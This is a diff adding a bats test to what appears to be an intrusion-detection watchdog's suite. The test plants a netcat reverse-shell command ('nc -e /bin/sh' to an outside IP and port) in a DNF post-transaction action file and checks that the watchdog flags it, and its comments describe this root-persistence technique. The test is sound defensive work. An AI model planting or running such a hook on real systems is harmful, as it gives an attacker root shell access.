@@ -251,3 +251,20 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in dnf-plugins action: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # bash-completion/anacrontab/apt-hooks/boot-script/ca-certificates/
+    # dhcpcd-hooks/display-manager-hooks nc reverse-shell variant
+    # INVARIANTs across the brain. Lock the netcat axis on the
+    # post-transaction-actions plugin surface (T1546 — DNF runs each
+    # action command AS ROOT after a matching package transaction;
+    # sister-vector to apt-hooks DPkg::Pre/Post-Invoke on the Debian
+    # side).
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '*:in:nc -e /bin/sh 1.1.1.1 4444\n' > "${ACTION}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
